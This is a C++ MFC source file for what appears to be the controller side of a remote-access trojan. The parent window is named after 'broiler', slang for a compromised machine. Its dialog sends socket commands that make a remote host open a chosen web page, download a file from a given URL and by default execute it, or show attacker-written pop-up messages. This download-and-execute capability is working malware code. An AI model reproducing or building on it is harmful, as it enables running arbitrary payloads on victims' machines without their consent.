// RemoteCmd.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "RemoteCmdDlg.h"
#include "BroilerData.h"

// CRemoteCmd 对话框
#define TYPE_ICON_NORMAL   _T("普通")
#define TYPE_ICON_QUERY    _T("询问")
#define TYPE_ICON_WARNING  _T("警告")
#define TYPE_ICON_ERROR    _T("错误")

#define TYPE_BTN_1        _T("确定")
#define TYPE_BTN_2        _T("确定、取消")
#define TYPE_BTN_3        _T("是、否")
#define TYPE_BTN_4        _T("是、否、取消")
#define TYPE_BTN_5        _T("重试、取消")
#define TYPE_BTN_6        _T("终止、重试、忽略")


static UINT idArray[] = {ID_RES_REMOTECMD1,     //状态栏
                         ID_RES_REMOTECMD2};


IMPLEMENT_DYNAMIC(CRemoteCmdDlg, CDialog)

CRemoteCmdDlg::CRemoteCmdDlg(CWnd* pParent /*=NULL*/, SOCKET sock)
	: CDialog(CRemoteCmdDlg::IDD, pParent)
{
	m_socket = sock;
	m_hIcon = AfxGetApp()->LoadIcon(IDI_ICON_REMOTE);
}

CRemoteCmdDlg::~CRemoteCmdDlg()
{
}

void CRemoteCmdDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CHECK_RUN_FILE, m_checkRun);
	DDX_Control(pDX, IDC_COMBO_ICON, m_ComboxIcon);
	DDX_Control(pDX, IDC_COMBO_BUTTON, m_ComboxButton);
}


BEGIN_MESSAGE_MAP(CRemoteCmdDlg, CDialog)
	ON_BN_CLICKED(IDC_BTN_OPEN_WEBSITE, &CRemoteCmdDlg::OnBnClickedBtnOpenWebsite)
	ON_BN_CLICKED(IDC_BTN_DOWN_WEBSITE, &CRemoteCmdDlg::OnBnClickedBtnDownWebsite)
	ON_BN_CLICKED(IDC_BTN_SEND_WND, &CRemoteCmdDlg::OnBnClickedBtnSendWnd)
	ON_BN_CLICKED(IDC_BTN_PREVIEW_WND, &CRemoteCmdDlg::OnBnClickedBtnPreviewWnd)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CRemoteCmdDlg 消息处理程序
BOOL CRemoteCmdDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //如果按下的是回车键或ESC键，则截断消息
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CRemoteCmdDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
    SetIcon(m_hIcon, FALSE);
	// TODO:  在此添加额外的初始化
    DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CRemoteCmdDlg::DlgInit()
{
	m_checkRun.SetCheck(BST_CHECKED);

	m_ComboxIcon.InsertString(0, TYPE_ICON_NORMAL);
	m_ComboxIcon.InsertString(1, TYPE_ICON_QUERY);
	m_ComboxIcon.InsertString(2, TYPE_ICON_WARNING);
	m_ComboxIcon.InsertString(3, TYPE_ICON_ERROR);
	m_ComboxIcon.SetCurSel(0);  //设置默认选项

	m_ComboxButton.InsertString(0, TYPE_BTN_1);
	m_ComboxButton.InsertString(1, TYPE_BTN_2);
	m_ComboxButton.InsertString(2, TYPE_BTN_3);
	m_ComboxButton.InsertString(3, TYPE_BTN_4);
	m_ComboxButton.InsertString(4, TYPE_BTN_5);
	m_ComboxButton.InsertString(5, TYPE_BTN_6);
	m_ComboxButton.SetCurSel(0);  //设置默认选项

	m_StatusBar.Create(this);   //状态栏
	m_StatusBar.SetIndicators(idArray, sizeof(idArray) / sizeof(UINT));
	m_StatusBar.SetPaneInfo(0, idArray[0], SBPS_NORMAL, 400);
	m_StatusBar.SetPaneInfo(1, idArray[1], SBPS_NORMAL, 200);
	m_StatusBar.SetPaneText(0 , _T("就绪"));
	m_StatusBar.SetPaneText(1 , _T(""));
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //显示工具栏和状态栏（这句话一定要加上, 否则工具栏不显示）
}

void CRemoteCmdDlg::SendCmdMsg(IN BROADCAST_C tagBroadCast)  //发送网页消息
{
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_BROADCAST;
	memcpy((char*)tagMsgInfo.context, (char*)&tagBroadCast, sizeof(BROADCAST_C));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
}

//发送打开网页命令
void CRemoteCmdDlg::OnBnClickedBtnOpenWebsite()
{
	CString strWebSite = _T("");
	GetDlgItemText(IDC_EDIT_OPEN_WEB, strWebSite);
	if (strWebSite.IsEmpty())
	{
		::MessageBox(this->m_hWnd, _T("请输入指定的网址"), _T("提示"), MB_OK | MB_ICONWARNING);
		return ;
	}
	BROADCAST_C tagBroadCast;
	memset(&tagBroadCast, 0, sizeof(BROADCAST_C));
	tagBroadCast.bTag = true;
	tagBroadCast.tagInternet.bDownLoad = false;
	tagBroadCast.tagInternet.bRunExe = false;
	wsprintfW(tagBroadCast.tagInternet.szWebSite, strWebSite);  //路径
	SendCmdMsg(tagBroadCast);

	wchar_t szText[] = _T("正在打开网页........");
	::SendMessageW(m_StatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)szText);
}

//发送下载网页文件命令
void CRemoteCmdDlg::OnBnClickedBtnDownWebsite()
{
	CString strWebSite = _T("");
	GetDlgItemText(IDC_EDIT_DOWN_WEB, strWebSite);
	if (strWebSite.IsEmpty())
	{
		::MessageBox(this->m_hWnd, _T("请输入指定的网址"), _T("提示"), MB_OK | MB_ICONWARNING);
		return ;
	}
	BROADCAST_C tagBroadCast;
	memset(&tagBroadCast, 0, sizeof(BROADCAST_C));
	tagBroadCast.bTag = true;
	tagBroadCast.tagInternet.bRunExe = (m_checkRun.GetCheck() == 1 ? true : false);
	tagBroadCast.tagInternet.bDownLoad = true;
	wsprintfW(tagBroadCast.tagInternet.szWebSite, strWebSite);
	SendCmdMsg(tagBroadCast);
	
	GetDlgItem(IDC_BTN_DOWN_WEBSITE)->EnableWindow(FALSE);  //禁用掉下载按钮
	GetDlgItem(IDC_BTN_OPEN_WEBSITE)->EnableWindow(FALSE);  //禁用掉打开网页按钮（以免影响结果）
	GetDlgItem(IDC_BTN_SEND_WND)->EnableWindow(FALSE);      
	GetDlgItem(IDC_BTN_PREVIEW_WND)->EnableWindow(FALSE);
	wchar_t szText[] = _T("正在下载文件........");
	::SendMessageW(m_StatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)szText);
}

//发送弹出窗口命令
void CRemoteCmdDlg::OnBnClickedBtnSendWnd()
{
	CString strTitle = _T(""); //标题
	CString strContent = _T("");  //内容
	GetDlgItemText(IDC_EDIT_MSG_TITLE, strTitle);
	GetDlgItemText(IDC_EDIT_MSG_CONTENT, strContent);
	UINT nIconType = GetIconType();
	UINT nBtnType  = GetBtnType();
	BROADCAST_C tagBroadCast;
	memset(&tagBroadCast, 0, sizeof(BROADCAST_C));
	tagBroadCast.bTag = false;
	tagBroadCast.tagWndInfo.nType = (nIconType | nBtnType);
	wsprintfW(tagBroadCast.tagWndInfo.szTitle, strTitle);
	wsprintfW(tagBroadCast.tagWndInfo.szContent, strContent);
	SendCmdMsg(tagBroadCast);

	wchar_t szText[] = _T("就绪");
	::SendMessageW(m_StatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)szText);
}

//发送本地预览窗口命令
void CRemoteCmdDlg::OnBnClickedBtnPreviewWnd()
{
	CString strTitle = _T(""); //标题
	CString strContent = _T("");  //内容
	GetDlgItemText(IDC_EDIT_MSG_TITLE, strTitle);
	GetDlgItemText(IDC_EDIT_MSG_CONTENT, strContent);
	UINT nIconType = GetIconType();
	UINT nBtnType  = GetBtnType();
	::MessageBox(this->m_hWnd, strContent, strTitle, nIconType | nBtnType);
}

//获取弹窗图标
UINT CRemoteCmdDlg::GetIconType()
{
	UINT nIconType;
	int nIndex = m_ComboxIcon.GetCurSel();
	CString strIcon = _T("");
	m_ComboxIcon.GetLBText(nIndex, strIcon);

	if (TYPE_ICON_NORMAL == strIcon)  //普通
	{
		nIconType = MB_ICONEXCLAMATION;
	}
	else if (TYPE_ICON_QUERY == strIcon)  //询问
	{
		nIconType = MB_ICONQUESTION;
	}
	else if (TYPE_ICON_WARNING == strIcon)  //警告
	{
		nIconType = MB_ICONWARNING;
	}
	else if (TYPE_ICON_ERROR == strIcon)   //错误
	{
		nIconType = MB_ICONERROR;
	}
	return nIconType;
}

UINT CRemoteCmdDlg::GetBtnType()
{
	UINT nBtnType;
	int nIndex = m_ComboxButton.GetCurSel();
	CString strButton = _T("");
	m_ComboxButton.GetLBText(nIndex, strButton);

	if (TYPE_BTN_1 == strButton)   //一个确定按钮
	{
		nBtnType = MB_OK;
	}
	else if (TYPE_BTN_2 == strButton)  //一个确定按钮，一个取消按钮
	{
		nBtnType = MB_OKCANCEL ;
	}
	else if (TYPE_BTN_3 == strButton) //是、否
	{
		nBtnType = MB_YESNO;
	}
	else if (TYPE_BTN_4 == strButton) //是、否、取消
	{
		nBtnType = MB_YESNOCANCEL;
	}
	else if (TYPE_BTN_5 == strButton) //重试、取消
	{
		nBtnType = MB_RETRYCANCEL ;
	}
	else if (TYPE_BTN_6 == strButton) //终止、重试、忽略
	{
		nBtnType = MB_ABORTRETRYIGNORE;
	}
	return nBtnType;
}

void CRemoteCmdDlg::UpDateStatusBar(IN const wchar_t* pRetContent)
{
	::SendMessageW(m_StatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)pRetContent);
	GetDlgItem(IDC_BTN_OPEN_WEBSITE)->EnableWindow(TRUE);
	GetDlgItem(IDC_BTN_DOWN_WEBSITE)->EnableWindow(TRUE);
	GetDlgItem(IDC_BTN_SEND_WND)->EnableWindow(TRUE);      
	GetDlgItem(IDC_BTN_PREVIEW_WND)->EnableWindow(TRUE);
}

HBRUSH CRemoteCmdDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  在此更改 DC 的任何属性
	if (IDC_STATIC_BROADTIP == pWnd->GetDlgCtrlID() && CTLCOLOR_STATIC == nCtlColor)
	{
		pDC->SetTextColor(RGB(255,0,0));   //字体颜色
		pDC->SetBkMode(TRANSPARENT);
	}
	// TODO:  如果默认的不是所需画笔，则返回另一个画笔
	return hbr;
}

void CRemoteCmdDlg::OnCancel()
{
	// TODO: 在此添加专用代码和/或调用基类
	DestroyWindow();
	delete this;
}

void CRemoteCmdDlg::PostNcDestroy()
{
	// TODO: 在此添加专用代码和/或调用基类
	CDialog::PostNcDestroy();
	((CBroilerData*)this->m_pParentWnd)->m_pRemoteCmdDlg = NULL;
}

